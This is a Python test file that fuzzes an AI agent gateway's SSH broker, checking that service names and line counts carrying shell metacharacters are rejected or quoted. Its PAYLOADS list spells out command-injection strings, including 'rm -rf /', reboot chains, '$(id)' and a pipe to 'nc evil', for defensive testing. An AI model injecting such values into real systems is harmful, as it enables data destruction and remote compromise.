"""P3: SSH params with shell metacharacters are rejected or safely quoted (SPEC §19)."""

import re
import shlex
from typing import Any

import pytest
from hypothesis import given
from hypothesis import strategies as st
from pydantic import ValidationError

from agent_gateway.brokers.output import BrokerError
from agent_gateway.brokers.ssh import SshBroker
from agent_gateway.brokers.ssh.commands import (
    logs_tail_command,
    service_restart_command,
    service_status_command,
)
from agent_gateway.brokers.ssh.models import (
    SERVICE_PATTERN,
    LogsParams,
    ServiceParams,
    SshHostAttributes,
)
from agent_gateway.common.errors import InvalidParamsError
from agent_gateway.modules.action_registry.registry import InMemoryActionRegistry
from tests.unit.broker_support import ssh_attributes

METACHARACTERS = [
    ";",
    "&&",
    "||",
    "|",
    "`",
    "$(",
    ")",
    "$",
    "\n",
    "\r",
    ">",
    "<",
    "&",
    "'",
    '"',
    "\\",
    " ",
    "\t",
    "*",
    "?",
    "~",
    "#",
    "!",
    "{",
    "}",
    "\x00",
]

PAYLOADS = [
    "nginx; rm -rf /",
    "nginx && reboot",
    "nginx || reboot",
    "nginx | nc evil 1",
    "`id`",
    "nginx`id`",
    "$(id)",
    "nginx$(reboot)",
    "${IFS}reboot",
    "nginx\nreboot",
    "nginx\n",
    "\nnginx",
    "nginx\r\nreboot",
    "nginx > /etc/passwd",
    "nginx < /dev/zero",
    "nginx & reboot",
    "'nginx'",
    '"nginx"',
    "nginx\\",
    "-H evil",
    "--help",
    "nginx\x00reboot",
    "nginx #",
    "*",
    "~root",
    "",
    " ",
]

SAFE_RE = re.compile(SERVICE_PATTERN.removeprefix("^").removesuffix("$"))
ALLOWED = ("nginx", "app")


def _attrs(services: tuple[str, ...] = ALLOWED, **overrides: Any) -> SshHostAttributes:
    return SshHostAttributes.model_validate(ssh_attributes(allowed_services=services, **overrides))


def _registry() -> InMemoryActionRegistry:
    registry = InMemoryActionRegistry()
    SshBroker().register(registry)
    return registry


SERVICE_ACTIONS = ["ssh.service.status", "ssh.service.restart", "ssh.logs.tail"]


@pytest.mark.parametrize("payload", PAYLOADS)
@pytest.mark.parametrize("action_id", SERVICE_ACTIONS)
def test_known_payloads_rejected_by_registry(action_id: str, payload: str) -> None:
    with pytest.raises(InvalidParamsError):
        _registry().validate_params(action_id, {"service": payload})


@pytest.mark.parametrize("payload", PAYLOADS)
def test_known_payloads_rejected_by_command_builders(payload: str) -> None:
    """Even if param validation were bypassed, the builders refuse the value."""
    attrs = _attrs()
    for build in (service_status_command, service_restart_command):
        with pytest.raises(BrokerError):
            build(payload, attrs)
    with pytest.raises(BrokerError):
        logs_tail_command(payload, 10, attrs)


@pytest.mark.parametrize("payload", PAYLOADS)
def test_known_payloads_cannot_be_allowlisted(payload: str) -> None:
    with pytest.raises(ValidationError):
        _attrs((payload,))


@pytest.mark.parametrize("lines", ["10; reboot", "10\n", "$(id)", True, 0, 501, -1, 1.5, "10"])
def test_lines_must_be_a_bounded_int(lines: object) -> None:
    with pytest.raises(InvalidParamsError):
        _registry().validate_params("ssh.logs.tail", {"service": "nginx", "lines": lines})


def test_extra_params_are_rejected() -> None:
    with pytest.raises(InvalidParamsError):
        _registry().validate_params("ssh.service.status", {"service": "nginx", "cmd": "id"})
    with pytest.raises(InvalidParamsError):
        _registry().validate_params("ssh.system.info", {"command": "id"})


fuzz_text = st.lists(
    st.one_of(
        st.sampled_from(METACHARACTERS),
        st.text(min_size=1, max_size=8),
        st.sampled_from(["nginx", "app", "id", "reboot"]),
    ),
    min_size=1,
    max_size=8,
).map("".join)


@given(fuzz_text)
def test_fuzz_service_is_rejected_or_exactly_one_safe_token(service: str) -> None:
    try:
        params = ServiceParams.model_validate({"service": service})
    except ValidationError:
        accepted = False
    else:
        accepted = True
        assert params.service == service
        assert SAFE_RE.fullmatch(service)
        assert not any(meta in service for meta in METACHARACTERS)

    attrs = _attrs((*ALLOWED, service)) if accepted else _attrs()
    for build in (service_status_command, service_restart_command):
        if not accepted:
            with pytest.raises(BrokerError):
                build(service, attrs)
            continue
        argv = shlex.split(build(service, attrs))
        # The service is exactly one argument, after "--", so it cannot become an option.
        assert argv[-1] == service
        assert argv[-2] == "--"


@given(fuzz_text, st.integers(min_value=-10, max_value=1000))
def test_fuzz_logs_params(service: str, lines: int) -> None:
    try:
        params = LogsParams.model_validate({"service": service, "lines": lines})
    except ValidationError:
        return
    assert 1 <= params.lines <= 500
    argv = shlex.split(logs_tail_command(service, lines, _attrs((*ALLOWED, service))))
    assert argv[argv.index("-u") + 1] == service
    assert argv[-1] == str(lines)


@given(st.text())
def test_shlex_join_keeps_any_text_as_one_argument(value: str) -> None:
    """The quoting layer alone already neutralises arbitrary text."""
    value = value.replace("\x00", "")
    assert shlex.split(shlex.join(["systemctl", "status", "--", value])) == [
        "systemctl",
        "status",
        "--",
        value,
    ]
